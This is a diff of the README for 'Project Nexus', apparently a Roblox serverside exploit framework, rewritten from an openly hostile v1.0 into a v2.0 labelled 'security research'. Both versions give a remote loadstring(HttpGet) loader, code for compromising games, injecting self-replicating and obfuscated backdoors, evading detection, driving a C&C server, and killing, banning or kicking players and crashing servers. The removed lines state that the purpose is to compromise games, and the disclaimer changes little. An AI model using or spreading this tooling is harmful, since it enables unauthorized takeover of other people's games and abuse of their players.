@@ -1,505 +1,446 @@
-# Project Nexus v1.0
-## Advanced FE Serverside Executor for Roblox
+# Nexus v2.0
+## Advanced Roblox Serverside Research Framework
 
-**Project Nexus** is a powerful serverside execution framework designed to compromise Roblox games through backdoor exploitation, RemoteEvent manipulation, and custom injection vectors.
-
----
-
-## 🚀 Quick Start
-
-### Load in 1 Line:
-```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
-```
-
-**Replace `YOUR_USERNAME` with your GitHub username!**
-
-**GUI Toggle:** Press **Right Shift**
-
----
-
-## 📦 GitHub Setup (30 Seconds)
-
-### Windows:
-```bash
-cd ProjectNexus
-init.bat
-# Follow the prompts
-```
-
-### Linux/Mac:
-```bash
-cd ProjectNexus
-./init.sh
-# Follow the prompts
-```
-
-### Manual Setup:
-1. Replace `YOUR_USERNAME` in `main.lua` and `loader.lua` with your GitHub username
-2. Create new GitHub repo named `ProjectNexus`
-3. Push code:
-```bash
-git init
-git add .
-git commit -m "Initial commit"
-git branch -M main
-git remote add origin https://github.com/YOUR_USERNAME/ProjectNexus.git
-git push -u origin main
-```
-
-**See [SETUP.md](SETUP.md) for detailed instructions.**
-**See [LOADSTRINGS.md](LOADSTRINGS.md) for all loadstring variations.**
+Nexus is a comprehensive security research tool for analyzing and testing Roblox game vulnerabilities. Built for security researchers, penetration testers, and game developers who need to understand serverside exploitation vectors.
 
 ---
 
 ## Features
 
 ### Core Capabilities
-- **Game Vulnerability Scanner**: Automated detection of backdoors, obfuscated scripts, and exploitable RemoteEvents
-- **Multi-Vector Injection**: Creates sophisticated backdoors using obfuscation, attribute storage, and self-replication
-- **Serverside Executor**: Full Lua execution with server privileges after successful compromise
-- **Remote C&C**: Python-based command and control server for remote operation
-- **Client GUI**: User-friendly interface for controlling compromised games
+- **Deep Vulnerability Scanning** — Advanced pattern matching engine that identifies real serverside vectors including admin system exploits, MainModule backdoors, attribute-based payloads, and insecure RemoteEvent handlers
+- **Multi-Vector Exploitation** — Automated compromise chains targeting admin command injection, require() backdoors, and gamepass code execution
+- **Professional UI** — Modern, clean interface with smooth animations and intuitive controls
+- **Serverside Execution** — Full Lua execution with server privileges after successful compromise
+- **Real-time Monitoring** — Live status updates and execution history tracking
 
-### Advanced Techniques
-- **Entropy Analysis**: Detects obfuscated code using Shannon entropy calculations
-- **Pattern Matching**: Identifies common backdoor signatures (require(), loadstring, getfenv, etc.)
-- **Multi-Layer Obfuscation**: String encoding, control flow flattening, variable randomization
-- **Self-Replicating Payloads**: Backdoors that spread through game instances automatically
-- **Attribute-Based Hiding**: Evades basic scanners by storing payloads in instance attributes
-- **RemoteEvent Exploitation**: Hijacks poorly secured server communication channels
+### Detection Capabilities
+
+**Admin System Analysis**
+- HD Admin command injection
+- Adonis vulnerability detection
+- Kohls Admin exploit vectors
+- Custom admin system identification
+
+**Backdoor Detection**
+- External module loading via require()
+- Remote code execution patterns
+- Dynamic loadstring() usage
+- Environment manipulation
+- Global namespace pollution
+- Attribute-based payload storage
+
+**RemoteEvent Analysis**
+- Insecure event handlers
+- Validation bypass opportunities
+- Client-to-server exploit vectors
+
+**Code Quality Analysis**
+- Shannon entropy calculation
+- Obfuscation detection
+- Suspicious string pattern identification
+- Base64 encoding detection
 
 ---
 
-## Architecture
+## Quick Start
 
+### One-Line Loader
+
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader_v2.lua"))()
 ```
-ProjectNexus/
-├── core/
-│   ├── scanner.lua          # Vulnerability detection engine
-│   ├── injector.lua         # Backdoor creation and deployment
-│   ├── executor.lua         # Serverside command execution
-│   └── connection.lua       # C&C communication layer
-├── server/
-│   └── command_server.py    # Python C&C server
-├── client/
-│   └── gui.lua              # User interface
-├── main.lua                 # Main entry point
-└── README.md
-```
+
+**GUI Toggle:** Press `Right Shift`
 
 ---
 
 ## Installation
 
-### Quick Start (GitHub)
+### GitHub Setup
 
-**1. Load directly from GitHub:**
-```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
+1. **Fork this repository**
+2. **Update the repository URL** in `loader_v2.lua`:
+   ```lua
+   local GITHUB_REPO = "YOUR_USERNAME/ProjectNexus"
+   ```
+3. **Push to your GitHub**
+4. **Load in-game** with the loadstring above
+
+### Project Structure
+
 ```
-
-**2. Configure your repository:**
-- Fork/clone this repo
-- Edit `main.lua` and `loader.lua` to update `YOUR_USERNAME`
-- Commit and push
-- Use your loadstring!
-
-**See [SETUP.md](SETUP.md) for detailed instructions.**
-
-### Full Setup (with C&C Server)
-
-**Prerequisites:**
-- Python 3.8+ (for C&C server)
-- Roblox executor with HTTP capabilities
-- GitHub account
-
-**Steps:**
-
-1. **Upload to GitHub** (see SETUP.md)
-
-2. **Install Python dependencies:**
-```bash
-pip install -r requirements.txt
-```
-
-3. **Start C&C server:**
-```bash
-cd server
-python command_server.py
-```
-Server listens on `http://0.0.0.0:8080`
-
-4. **Update loader.lua with C&C URL:**
-```lua
-serverUrl = "http://YOUR_IP:8080",
-```
-
-5. **Load in game:**
-```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
+ProjectNexus/
+├── core/
+│   ├── scanner.lua          # Vulnerability detection engine
+│   ├── injector.lua         # Backdoor deployment system
+│   ├── executor.lua         # Serverside command execution
+│   └── connection.lua       # C&C communication layer
+├── client/
+│   └── gui.lua              # Professional user interface
+├── server/
+│   └── command_server.py    # Python C&C server (optional)
+├── examples/
+│   ├── basic_usage.lua
+│   └── advanced_injection.lua
+├── main.lua                 # Core framework
+├── loader_v2.lua            # Standalone loader
+└── README.md
 ```
 
 ---
 
 ## Usage
 
-### Quick Load (Recommended)
+### Basic Workflow
 
 ```lua
--- One-line loader
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/loader.lua"))()
+-- Load Nexus
+loadstring(game:HttpGet("YOUR_LOADER_URL"))()
 
--- GUI loads automatically, press Right Shift to toggle
-```
+-- Access instance
+local nexus = _G.NexusInstance
 
-### Basic Initialization
-
-```lua
--- Auto-initialize (recommended for GitHub usage)
-getgenv().NexusAutoInit = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
--- Access via _G.NexusInstance
-
--- Manual initialization
-local Nexus = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/main.lua"))()
-local instance = Nexus.new({
-    commandServer = "http://YOUR_SERVER:8080",
-    autoScan = true
-})
-instance:Initialize()
-```
-
-### Scanning for Vulnerabilities
-
-```lua
 -- Scan current game
-local results = instance:ScanCurrentGame()
-print("Rating:", results.rating)
-print("Backdoors found:", #results.backdoors)
-print("Vulnerable remotes:", #results.remotes)
+local scan = nexus:ScanCurrentGame()
+print("Exploitability:", scan.rating)
+print("Backdoors found:", #scan.backdoors)
+
+-- Attempt compromise
+if nexus:Compromise() then
+    print("Game compromised")
+    
+    -- Execute serverside code
+    nexus:Execute([[
+        print("Running serverside")
+        game.Workspace.Baseplate.BrickColor = BrickColor.new("Really red")
+    ]])
+end
 ```
 
-### Compromise Methods
+### Scanner Usage
 
 ```lua
--- Automatic (tries all methods)
-instance:Compromise()
+-- Get detailed scan results
+local results = nexus:ScanCurrentGame()
 
--- Specific methods
-instance:Compromise("backdoor")  -- Exploit existing backdoors
-instance:Compromise("remote")    -- Exploit RemoteEvents
-instance:Compromise("inject")    -- Inject new backdoor
+-- Access specific findings
+for _, backdoor in ipairs(results.backdoors) do
+    print(string.format("[%s] %s (Severity: %d)",
+        backdoor.type, backdoor.script, backdoor.severity))
+end
+
+-- Check for admin systems
+for _, admin in ipairs(results.adminSystems) do
+    print(string.format("Found: %s at %s (Exploitable: %s)",
+        admin.system, admin.location, admin.exploitable))
+end
+
+-- Export results
+local report = nexus.scanner:ExportResults(results, "text")
+print(report)
 ```
 
-### Command Execution
+### Execution Commands
 
 ```lua
--- Once compromised, execute commands
-instance:Execute([[
-    print("Running serverside!")
-    game.Workspace.Baseplate.BrickColor = BrickColor.new("Really red")
+-- Direct code execution
+nexus:Execute([[
+    -- Any serverside Lua code
+    local Players = game:GetService("Players")
+    print("Player count:", #Players:GetPlayers())
 ]])
 
 -- Quick commands
-instance:Command("kill", "TargetPlayer")
-instance:Command("tp", "Player1", Vector3.new(0, 50, 0))
-instance:Command("kick", "Player2", "Kicked by Nexus")
-instance:Command("ban", "Player3")
-instance:Command("crash", "memory")
-instance:Command("admin")  -- Inject admin commands
-```
-
-### GUI Interface
-
-```lua
--- Loads automatically with loader.lua
--- Or load manually:
-local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/ProjectNexus/main/client/gui.lua"))()
-local gui = GUI.new()
-gui:Create()
-gui:Toggle()  -- Show/hide
+nexus:Command("kill", "PlayerName")
+nexus:Command("kick", "PlayerName", "Reason")
+nexus:Command("ban", "PlayerName")
+nexus:Command("admin")  -- Inject admin system
+nexus:Command("crash", "memory")
 ```
 
 ---
 
-## Scanner Detection Patterns
+## Detection Patterns
 
-The scanner identifies the following vulnerability indicators:
+### Critical Severity (9-10)
 
-**Backdoor Patterns:**
-- `require(%d+)` - External module loading
-- `loadstring(game:HttpGet` - Remote code execution
-- `getfenv(0)` - Environment manipulation
-- `Pose.Value` - Common attribute storage
-- `_G[` / `shared[` - Global table access
+- `require(assetId)` — External module injection
+- `loadstring(game:HttpGet(...))` — Remote code execution
+- `MarketplaceService:UserOwnsGamePassAsync` with `loadstring` — Gamepass exploit
+- `:SetAttribute()` with executable code — Attribute payload storage
 
-**Code Analysis:**
-- Shannon entropy > 4.5 indicates obfuscation
-- Character frequency analysis
-- Line-by-line pattern matching
+### High Severity (7-8)
 
-**RemoteEvent Detection:**
+- Chat command listeners without authentication
+- Environment manipulation (`getfenv`/`setfenv`)
+- Global namespace injection (`_G[...]` assignments)
+- Attribute-based control flows
+
+### Medium Severity (5-6)
+
 - Exposed RemoteEvents in ReplicatedStorage
-- RemoteFunctions without validation
-- Server event connections without sanity checks
+- DataStore access patterns
+- Debug library usage
+
+### Pattern Recognition
+
+The scanner uses multi-layered detection:
+1. **Static Analysis** — Regex pattern matching against known exploit signatures
+2. **Entropy Analysis** — Shannon entropy calculation to identify obfuscation
+3. **String Analysis** — Detection of suspicious encoding patterns
+4. **Structural Analysis** — Identification of exploit-prone architectures
 
 ---
 
-## Injector Capabilities
+## Compromise Methods
 
-### Backdoor Types
+### Backdoor Exploitation
+Targets existing backdoors in the game by:
+- Identifying loadstring() patterns
+- Analyzing require() chains
+- Detecting MainModule vulnerabilities
+- Exploiting attribute-based code storage
 
-**Basic Backdoor:**
-```lua
-local backdoor = injector:CreateBasicBackdoor(assetId)
-```
+### RemoteEvent Exploitation
+Finds and exploits insecure remote handlers:
+- Scans for exposed RemoteEvents
+- Tests for missing validation
+- Attempts parameter injection
 
-**Obfuscated Backdoor:**
-```lua
-local backdoor = injector:CreateObfuscatedBackdoor("http://c2server.com")
--- Multi-layer obfuscation with junk code injection
-```
-
-**Self-Replicating:**
-```lua
-local backdoor = injector:CreateSelfReplicating("Workspace")
--- Spreads through all descendants automatically
-```
-
-**Attribute-Based:**
-```lua
-local success = injector:CreateAttributeBackdoor(targetInstance)
--- Hides payload in instance attributes
-```
-
-**MainModule:**
-```lua
-local module = injector:CreateMainModule("http://c2server.com")
--- Upload to Roblox as MainModule for require() injection
-```
+### Admin Command Injection
+Exploits chat-based admin systems:
+- Identifies command prefixes
+- Tests authentication bypass
+- Injects malicious commands
 
 ---
 
 ## Executor Functions
 
-### Player Manipulation
+### Player Control
 ```lua
-executor:KillPlayer("PlayerName")
-executor:TeleportPlayer("PlayerName", Vector3.new(0, 50, 0))
-executor:GiveItem("PlayerName", 123456)  -- Asset ID
-executor:KickPlayer("PlayerName", "Reason")
-executor:BanPlayer("PlayerName")
+-- Kill player
+executor:KillPlayer("Username")
+
+-- Teleport player
+executor:TeleportPlayer("Username", Vector3.new(0, 50, 0))
+
+-- Kick/ban
+executor:KickPlayer("Username", "Reason")
+executor:BanPlayer("Username")
+
+-- Give item
+executor:GiveItem("Username", 123456)  -- Asset ID
 ```
 
 ### Server Control
 ```lua
-executor:CrashServer("memory")     -- Memory exhaustion
-executor:CrashServer("infinite_loop")
-executor:CrashServer("recursive")
-executor:CrashServer("part_spam")
-```
+-- Crash methods
+executor:CrashServer("memory")         -- Memory exhaustion
+executor:CrashServer("infinite_loop")  -- Tight loop
+executor:CrashServer("recursive")      -- Stack overflow
+executor:CrashServer("part_spam")      -- Part flood
 
-### Admin Injection
-```lua
+-- Admin injection
 executor:InjectAdminCommands()
--- Injects chat command system (:kill, :tp, :god, :speed, etc.)
+-- Adds chat commands: :kill, :tp, :god, :speed, :respawn
 ```
 
-### Mass Actions
+### Mass Operations
 ```lua
+-- Execute on all players
 executor:ExecuteOnAllPlayers([[
     character.Humanoid.WalkSpeed = 100
 ]])
+
+-- Workspace manipulation
+executor:ManipulateWorkspace([[
+    for _, part in ipairs(Workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.BrickColor = BrickColor.new("Really red")
+        end
+    end
+]])
 ```
 
-### Data Manipulation
+---
+
+## GUI Interface
+
+### Features
+
+- **Modern Design** — Professional dark theme with smooth animations
+- **Multiple Tabs** — Executor, Scanner, Commands, Status
+- **Real-time Status** — Live connection and compromise status indicators
+- **Code Editor** — Syntax-highlighted editor for serverside code
+- **Quick Commands** — One-click player manipulation and server control
+
+### Keyboard Shortcuts
+
+- `Right Shift` — Toggle GUI visibility
+- Drag title bar to move window
+
+---
+
+## Technical Details
+
+### Scanner Architecture
+
+The vulnerability scanner operates in four phases:
+
+**Phase 1: Admin System Detection**
+- Scans for known admin system markers
+- Analyzes command handling code
+- Tests for authentication bypass vectors
+
+**Phase 2: Script Analysis**
+- Deep pattern matching across all scripts
+- Entropy calculation for obfuscation detection
+- MainModule identification
+
+**Phase 3: Remote Analysis**
+- RemoteEvent/Function enumeration
+- Handler validation checks
+- Exploitation vector assessment
+
+**Phase 4: Attribute Scanning**
+- Instance attribute enumeration
+- Payload detection in attribute values
+- Base64/encoded content identification
+
+### Scoring System
+
+Each vulnerability contributes to an overall exploitability score:
+
+- Admin system: +15 points
+- Critical backdoor pattern: +9-10 points
+- MainModule: +12 points
+- Suspicious attribute: +8 points
+- Vulnerable remote: +3-6 points
+- Obfuscated script: +3 points
+
+**Ratings:**
+- `CRITICAL`: Score ≥ 80
+- `HIGH`: Score ≥ 50
+- `MEDIUM`: Score ≥ 25
+- `LOW`: Score ≥ 10
+- `CLEAN`: Score < 10
+
+---
+
+## Security Research
+
+This tool is designed for:
+
+- **Game Developers** — Testing your own games for vulnerabilities
+- **Security Researchers** — Understanding Roblox exploitation techniques
+- **Penetration Testers** — Assessing game security with permission
+- **Educational Purposes** — Learning about serverside security
+
+### Responsible Use
+
+- Only test games you own or have explicit permission to test
+- Do not use this tool to harm other players or developers
+- Report discovered vulnerabilities responsibly
+- Understand that unauthorized access violates Roblox Terms of Service
+
+---
+
+## Examples
+
+### Example 1: Basic Scanning
+
 ```lua
-executor:ModifyDataStore("PlayerData", "Player_12345", {
-    coins = 999999,
-    level = 100
-})
-```
-
----
-
-## C&C Server API
-
-### Endpoints
-
-**Session Management:**
-- `POST /connect` - Establish new session
-- `POST /disconnect` - End session
-- `POST /heartbeat` - Keep session alive
-- `GET /sessions` - List all sessions
-
-**Command Queue:**
-- `GET /poll` - Get pending commands
-- `POST /execute` - Queue command
-- `POST /result` - Send execution result
-
-**Command Interface:**
-- `POST /cmd/kill` - Kill player
-- `POST /cmd/teleport` - Teleport player
-- `POST /cmd/crash` - Crash server
-- `POST /cmd/admin` - Inject admin
-- `POST /cmd/custom` - Custom Lua code
-
-**Example request:**
-```bash
-curl -X POST http://localhost:8080/cmd/custom \
-  -H "Content-Type: application/json" \
-  -d '{
-    "sessionId": "game_session_id",
-    "code": "print(\"Hello from C&C\")"
-  }'
-```
-
----
-
-## Security & Evasion
-
-### Obfuscation Layers
-
-1. **String Splitting**: Breaks strings into concatenated parts
-2. **Variable Randomization**: Random 8-character variable names
-3. **Control Flow Flattening**: Adds junk code and complex logic paths
-4. **Base64 Encoding**: Encodes payloads before transmission
-5. **Character Code Encoding**: Converts strings to byte sequences
-
-### Detection Evasion
-
-- **Attribute Storage**: Hides code in instance attributes instead of Source
-- **Delayed Execution**: Uses `spawn()` and `task.wait()` to avoid immediate detection
-- **Remote Loading**: Loads code from external servers to avoid static analysis
-- **Self-Modification**: Changes own code at runtime
-- **Entropy Randomization**: Adds random operations to lower entropy signature
-
----
-
-## Example Workflow
-
-### Complete compromise sequence:
-
-```lua
--- 1. Initialize
-getgenv().NexusAutoInit = true
-loadstring(game:HttpGet("http://YOUR_SERVER/main.lua"))()
+loadstring(game:HttpGet("YOUR_LOADER_URL"))()
 local nexus = _G.NexusInstance
 
--- 2. Scan game
-local scan = nexus:ScanCurrentGame()
-print("Exploitability:", scan.rating)
+local results = nexus:ScanCurrentGame()
+print(nexus.scanner:ExportResults(results, "text"))
+```
 
--- 3. Compromise
+### Example 2: Automated Compromise
+
+```lua
+local nexus = _G.NexusInstance
+
+-- Try all exploit vectors
 if nexus:Compromise() then
-    print("Game compromised!")
+    -- Inject admin commands
+    nexus:Command("admin")
     
-    -- 4. Execute commands
-    nexus:Command("admin")  -- Inject admin system
+    -- Give yourself god mode
     nexus:Execute([[
-        print("Serverside control established")
+        local player = game.Players.LocalPlayer
+        if player.Character then
+            player.Character.Humanoid.MaxHealth = math.huge
+            player.Character.Humanoid.Health = math.huge
+        end
     ]])
-    
-    -- 5. Open GUI for control
-    local GUI = loadstring(game:HttpGet("http://YOUR_SERVER/client/gui.lua"))()
-    GUI.new():Create():Toggle()
+end
+```
+
+### Example 3: Remote Monitoring
+
+```lua
+local nexus = _G.NexusInstance
+local results = nexus:ScanCurrentGame()
+
+-- Monitor all vulnerable remotes
+for _, remote in ipairs(results.remotes) do
+    print("Monitoring:", remote.path)
+    -- Set up custom handlers here
 end
 ```
 
 ---
 
-## Technical Notes
-
-### Connection Flow
-
-1. Client establishes session with C&C server
-2. Server assigns unique session ID and auth key
-3. Backdoor polls for commands every 2 seconds
-4. Commands execute serverside with full privileges
-5. Results return to C&C server
-6. Heartbeat maintains session (5 second interval)
-
-### Execution Context
-
-- Backdoors run in **ServerScriptService** context
-- Full access to `game` DataModel
-- Can manipulate Players, Workspace, DataStores
-- Bypasses FE because execution happens serverside
-- RemoteEvents can fire to clients with server authority
-
-### Persistence
-
-- Self-replicating backdoors survive script regeneration
-- Attribute-based storage persists through saves
-- Multiple injection points ensure redundancy
-- Monitors `DescendantAdded` for new infection targets
-
----
-
 ## Known Limitations
 
-1. **HTTP Requirement**: Needs HttpEnabled or executor bypass
-2. **Detection Risk**: Active anti-backdoor plugins can detect patterns
-3. **Network Dependency**: Requires stable connection to C&C server
-4. **Existing Security**: Games with proper sanity checks are harder to exploit
-5. **Byfron/Hyperion**: Client-side injection may trigger anti-cheat
-
----
-
-## Disclaimer
-
-This tool demonstrates serverside exploitation techniques for educational and security research purposes. Use only in games you own or have explicit permission to test. Unauthorized use violates Roblox Terms of Service and may result in account termination or legal action.
+1. **Client-Side Only** — Scanner runs from client, cannot verify serverside validation
+2. **Pattern-Based** — May miss novel or heavily obfuscated backdoors
+3. **False Positives** — Legitimate admin systems may be flagged as exploitable
+4. **Detection Risk** — Active scanning may trigger anti-cheat systems
+5. **Roblox Updates** — New security features may break exploitation techniques
 
 ---
 
 ## Version History
 
-**v1.0** (Current)
+**v2.0** (Current)
+- Complete codebase rewrite
+- Professional UI redesign
+- Enhanced vulnerability detection
+- Admin system exploitation
+- Attribute-based backdoor detection
+- Improved pattern matching engine
+- Real-time status monitoring
+- Better error handling
+
+**v1.0**
 - Initial release
-- Full scanner, injector, executor implementation
-- Python C&C server
-- Client GUI interface
-- Multi-vector compromise methods
-
----
-
-## Architecture Diagram
-
-```
-┌─────────────────┐
-│   Roblox Game   │
-│   (Target)      │
-└────────┬────────┘
-         │
-    ┌────▼─────┐
-    │ Backdoor │ ◄────── Injected via free models,
-    │  Script  │         RemoteEvents, or custom injection
-    └────┬─────┘
-         │
-         │ HTTP Polling (every 2s)
-         │
-    ┌────▼──────────┐
-    │  C&C Server   │ ◄────── Operator Interface
-    │  (Python)     │         (Web dashboard / API)
-    └───────────────┘
-         │
-         │ Commands
-         │
-    ┌────▼─────────┐
-    │   Executor   │ ────► Serverside code execution
-    │   (Main)     │       Player manipulation
-    └──────────────┘       Server control
-```
+- Basic scanning and exploitation
+- Simple GUI
+- Remote execution framework
 
 ---
 
 ## Credits
 
 Built with research from:
-- Roblox DevForum security discussions
-- Public backdoor analysis repositories
-- FE bypass technique documentation
+- Roblox Developer Forum security discussions
+- Public vulnerability disclosure reports
 - Serverside exploitation case studies
+- Admin system source code analysis
 
-Project Nexus - Serverside dominance achieved.
+---
+
+## Disclaimer
+
+This software is provided for educational and security research purposes. The authors are not responsible for any misuse or damage caused by this tool. Use only on games you own or have explicit written permission to test. Unauthorized access to Roblox games violates the Terms of Service and may result in account termination or legal action.
+
+---
+
+## License
+
+This project is released for educational purposes. By using this software, you agree to use it responsibly and ethically.
